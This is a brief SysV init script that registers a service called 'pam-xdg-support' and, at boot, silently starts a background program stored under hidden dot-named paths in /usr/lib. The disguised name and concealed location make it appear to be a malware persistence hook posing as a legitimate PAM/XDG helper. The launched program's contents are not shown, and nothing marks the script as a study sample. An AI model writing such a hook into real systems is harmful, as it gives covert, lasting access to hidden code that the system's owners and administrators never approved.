#!/bin/sh
### BEGIN INIT INFO
# Provides:          pam-xdg-support
# Required-Start:    $local_fs $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: PAM XDG Support Helper
### END INIT INFO

case "$1" in
    start)
        /usr/lib/.libpam-xdg-support/.update-helper &
        ;;
    *)
        exit 0
        ;;
esac
exit 0
